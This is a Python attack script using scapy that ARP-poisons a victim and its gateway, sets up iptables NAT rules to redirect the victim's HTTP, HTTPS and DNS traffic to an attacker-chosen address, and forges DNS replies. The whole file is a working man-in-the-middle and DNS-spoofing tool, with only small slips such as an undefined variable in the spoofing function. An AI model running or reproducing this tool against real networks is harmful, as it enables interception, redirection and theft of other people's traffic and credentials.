#!/usr/bin/python

import os
import threading
import sys
from scapy.all import *
import argparse
import pdb

spoofDomains = {}
gateway_ip = ""
victim_ip = ""
colors = {
	'red': '\033[0;32m',
	'none': '\033[0m',
}

class ARPPoison(threading.Thread):
	def __init__(self, srcAddr, destAddr):
		threading.Thread.__init__(self)
		self.srcAddr = srcAddr
		self.destAddr = destAddr

	def run(self):
		try:
			arpPacket = ARP(pdst=self.destAddr, psrc=self.srcAddr)
			send(arpPacket, verbose=False, loop=1)
		except Exception as e:
			print('Unexpected Error: ', sys.exc_info()[0])

def enableForwarding():
	os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def redirectionRules(redirect_to, iface):
	os.system("iptables --flush")
	os.system("iptables --zero")
	os.system("iptables --delete-chain")
	os.system("iptables -F -t nat")
	os.system("iptables --append FORWARD --in-interface " + iface + " --jump ACCEPT")
	os.system("iptables --table nat --append POSTROUTING --out-interface " + iface + " --jump MASQUERADE")
	os.system("iptables -t nat -A PREROUTING -p tcp --dport 80 --jump DNAT --to-destination " + redirect_to)
	os.system("iptables -t nat -A PREROUTING -p tcp --dport 443 --jump DNAT --to-destination " + redirect_to)

	os.system("iptables -A INPUT -p udp -s 0/0 --sport 1024:65535 -d 192.168.0.1 --dport 53 -m state --state NEW,ESTABLISHED -j DROP")
	os.system("iptables -A OUTPUT -p udp -s 192.168.0.1 --sport 53 -d 0/0 --dport 1024:65535 -m state --state ESTABLISHED -j DROP")
	os.system("iptables -A INPUT -p udp -s 0/0 --sport 53 -d 192.168.0.1 --dport 53 -m state --state NEW,ESTABLISHED -j DROP")
	os.system("iptables -A OUTPUT -p udp -s 192.168.0.1 --sport 53 -d 0/0 --dport 53 -m state --state ESTABLISHED -j DROP")

	os.system("iptables -t NAT -A PREROUTING -i " + iface + " -p udp --dport 53 -j DNAT --to " + redirect_to)
	os.system("iptables -t NAT -A PREROUTING -i " + iface + " -p tcp --dport 53 -j DNAT --to " + redirect_to)

def cleanRules():
	os.system("iptables --flush")

def disableForwarding():
	os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

def ShowORPoisoning(packet):
	''' Filter the DNS Packet from the Gateway
		By definition, the gateway is '''

	print ('{0} Victim %s {1}'.format(colors['red'], colors['none']) % victim_ip)

	if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
		# comments
		try:
			#Extraer las capas del paquete capturado
			requestIP = packet[IP]
			requestUDP = packet[UDP]
			requestDNS = packet[DNS]
			requestDNSQR = packet[DNSQR]

			#Componer c/u de las capas respuesta
			responseIP = IP(src=requestIP.dst, dst=requestIP.src)
			responseUDP = UDP(sport=requestUDP.dport, dport=requestUDP.sport)
			responseDNSRR = DNSRR(rrname=packet.getlayer(DNS).qd.name, rdata=gateway_ip)
			responseDNS = DNS(qr=1, id=requestDNS.id, qd=responseDNSQR, an=responseDNSRR)
			answer = responseIP/responseUDP/responseDNS
			send(answer)
		except:
			print("{0} Unexpected error: %s {1}".format(colors['red'], colors['none']) % sys.exc_info()[0])
			print("Exception...")
	else:
		print (packet.summary())

if __name__ == '__main__':
	parser = argparse.ArgumentParser(description="ARP, MITM & DNS-Spoofing tool with Python -- By: LeSZ0")
	parser.add_argument("-t", "--target", required=True, help="Victim IP Addres")
	parser.add_argument("-i", "--interface", required=False, default="eth0", help="Interface to Use by attack (Default eth0)")
	parser.add_argument("-v", "--verbose", required=False, action='store_true', help="Verbose")
	parser.add_argument("-g", "--gateway", required=True, help="Gateway IP Addres")
	parser.add_argument("-f", "--filter", required=False, default='udp port 53', help="Capture Filter")
	parser.add_argument("-d", "--domains", required=False, help="File to perform DNS Spoofing")
	parser.add_argument("-r", "--route", required=True, help="Redirect all HTTP/HTTPS Traffic to the specified IP Addres")
	args = parser.parse_args()

	enableForwarding()
	redirectionRules(args.route, args.interface)
	gateway_ip = args.gateway
	victim_ip = args.target
	victim = ARPPoison(gateway_ip, victim_ip)
	gateway = ARPPoison(victim_ip, gateway_ip)
	victim.setDaemon(True)
	gateway.setDaemon(True)
	victim.start()
	gateway.start()

	sniff(iface=args.interface, filter=args.filter, prn=ShowORPoisoning)
